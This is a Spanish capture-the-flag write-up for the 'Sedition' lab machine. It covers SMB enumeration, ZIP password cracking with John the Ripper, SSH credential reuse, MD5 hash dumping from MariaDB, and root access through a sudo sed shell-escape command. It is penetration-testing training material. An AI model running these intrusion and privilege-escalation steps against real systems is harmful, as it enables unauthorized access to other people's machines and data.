```markdown
# **Sedition - The Hackers Labs**
**Plataforma:** Linux
**Dificultad:** Media
**Autor:** [Tu nombre o equipo]

---

## **📌 Descripción**
Máquina Linux basada en Debian con servicios **SMB** y **SSH** expuestos. La explotación incluye:
- **Reconocimiento de hosts** con `netdiscover`.
- **Escaneo de puertos** con `nmap` (SMB y SSH en puerto no estándar).
- **Enumeración SMB** con `enum4linux` para descubrir usuarios y recursos compartidos.
- **Cracking de contraseñas** (archivo ZIP protegido) con `zip2john` y `John the Ripper`.
- **Movimiento lateral** mediante credenciales reutilizadas en MariaDB.
- **Escalada de privilegios** explotando permisos `sudo` con `sed`.

---

## **🔍 Reconocimiento de Hosts**
### **Comando:**
```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

### **Resultado:**
| **IP**      | **MAC Address**          | **Vendor**               |
|-------------|--------------------------|--------------------------|
| 10.0.4.1    | 52:54:00:12:35:00        | Unknown vendor           |
| 10.0.4.2    | 52:54:00:12:35:00        | Unknown vendor           |
| 10.0.4.3    | 08:00:27:67:2e:3e        | PCS Systemtechnik GmbH   |
| **10.0.4.52** | **08:00:27:9a:e7:06**    | **PCS Systemtechnik GmbH** |

🔹 **IP objetivo:** `10.0.4.52`

---

## **🚀 Escaneo de Puertos**
### **Comandos:**
```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.52
nmap -n -Pn -sCV -p139,445,65535 --min-rate 5000 10.0.4.52
```

### **Resultado:**
| **Puerto** | **Servicio**       | **Versión**                     |
|------------|--------------------|---------------------------------|
| 139/tcp    | Samba smbd         | 4                               |
| 445/tcp    | Samba smbd         | 4                               |
| **65535/tcp** | **OpenSSH**     | **9.2p1 Debian 2+deb12u6**      |

---

## **🔐 Enumeración SMB**
### **Comando:**
```bash
enum4linux -a 10.0.4.52
```

### **Hallazgos:**
- **Usuarios:** `cowboy`, `debian`.
- **Recursos compartidos accesibles:**
  - `backup` (lectura/escritura sin credenciales).
  - `print$`, `IPC$`, `nobody`.

---

## **💾 Extracción de Archivo ZIP**
### **Acceso al recurso `backup`:**
```bash
smbclient //10.0.4.52/backup -U guest
```
📁 **Archivo encontrado:** `secretito.zip`.

### **Cracking de contraseña:**
```bash
zip2john secretito.zip > hash3.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash3.txt
```
🔑 **Contraseña del ZIP:** `sebastian`.

### **Contenido del ZIP:**
```
elbunkermolagollon123
```

---

## **🔑 Movimiento Lateral (SSH)**
### **Conexión SSH:**
```bash
ssh cowboy@10.0.4.52 -p 65535
```
🔑 **Contraseña:** `elbunkermolagollon123`.

### **Enumeración:**
```bash
cat .bash_history
```
🔍 **Hallazgo:** Credenciales para MariaDB (`cowboy:elbunkermolagollon123`).

---

## **🗃️ Explotación de MariaDB**
### **Conexión a la base de datos:**
```bash
mariadb -u cowboy -p
```
📊 **Base de datos encontrada:** `bunker` → Tabla `users`.

### **Consulta:**
```sql
SELECT * FROM users;
```
🔑 **Hash MD5 para `debian`:**
```
7c6a180b36896a0a8c02787eeafb0e4c
```
🔓 **Contraseña crackeada:** `password1`.

---

## **🚀 Escalada de Privilegios (Sudo)**
### **Verificación de permisos:**
```bash
sudo -l
```
🔧 **Permiso encontrado:** `sudo /usr/bin/sed` (sin contraseña).

### **Explotación con `sed`:**
```bash
sudo /usr/bin/sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```
👑 **Acceso root obtenido.**

---

## **🏆 Flags**
### **Flag de usuario (`debian`):**
```bash
cat /home/debian/flag.txt
```
📌 **Contenido:** `pingxxxxxxxxxxxinazo`

### **Flag de root:**
```bash
cat /root/root.txt
```
📌 **Contenido:** `laflagdelxxxxxxxxxolaaunmas`

---
## **📝 Resumen de Pasos**
1. **Reconocimiento** → `netdiscover`.
2. **Escaneo** → `nmap`.
3. **Enumeración SMB** → `enum4linux`.
4. **Cracking ZIP** → `zip2john` + `John the Ripper`.
5. **SSH** → Reutilización de credenciales.
6. **MariaDB** → Explotación de credenciales.
7. **Escalada** → `sudo sed`.

---
## **🛠 Herramientas Utilizadas**
- `netdiscover`
- `nmap`
- `enum4linux`
- `smbclient`
- `zip2john`
- `John the Ripper`
- `MariaDB`
- `sed` (explotación sudo)

---
**⚠️ Nota:** Esta máquina es un entorno de práctica para pruebas de penetración. **No la uses en sistemas reales sin autorización.**
```
